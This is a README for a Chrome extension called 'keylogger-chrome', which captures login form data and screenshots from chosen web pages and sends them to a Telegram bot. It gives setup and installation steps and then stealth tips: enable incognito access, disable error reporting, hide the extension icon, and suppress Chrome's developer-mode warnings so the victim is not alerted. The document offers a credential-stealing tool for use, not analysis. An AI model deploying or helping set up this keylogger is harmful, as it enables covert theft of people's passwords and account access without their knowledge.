# keylogger-chrome

Chrome extension that gets login form data from specified webpages and sends it back to Telegram via Bot API, with screenshot.

| Name         | Value                  |
| -----------: | :--------------------- |
| Version      | First and the last     |
| Language     | Javascript, English    |
| Browser      | Chrome                 |
| License      | MIT                    |

-----

## Downloading

Copy-paste it in your terminal:

```
git clone https://github.com/czl3k/keylogger-chrome.git
```

... or click `Clone/Download` > `Download ZIP`, go to your Downloads directory and unpack it.

-----

## Setting up

Open main.js with your favourite text editor.

In constant `token` paste your Telegram bot token.

In constant `chatID`, paste chat's ID where messages should be sent to. It can be user, group or channel.

_Guide how to add custom webpages soon!_

-----

## Preparing

Open `chrome://extensions` page and enable Developer Mode in the right top corner. After that, please reload the page.

-----

## Installation

### First method (easier and faster)

Click `Load unpacked` option from `chrome://extensions` page. Choose keylogger's directory.

__That's it!__

### Second method (harder, but recommended)

Go to `chrome://extensions` and click `Pack extension`. Select keylogger's directory, path for key please leave empty. Click `Pack extension`.

After this, .crx file should be created. Now drag-and-drop the .crx file into `chrome://extensions` and confirm extension installation.
You may see "extension is corrupted" error, please **skip it** and go to the next section.

__All done!__

-----

## Disable annoying extension popups & Extension is corrupted

Every time you open Chrome on (w)indows, browser will ask user to disable extensions in Developer Mode.

In addition, .crx files cannot be installed, browser says they're corrupted.

To solve these problems, please follow
[this](https://stackoverflow.com/questions/23055651/disable-developer-mode-extensions-pop-up-in-chrome)
 great guide.

-----

## Tips & advices...

- in extension details, there is `run in incognito` option, turn it on

- disable `Error reporting` in extension details

- hide extension icon (right-click icon > Hide from menu)

___Good luck and have fun!___

-----
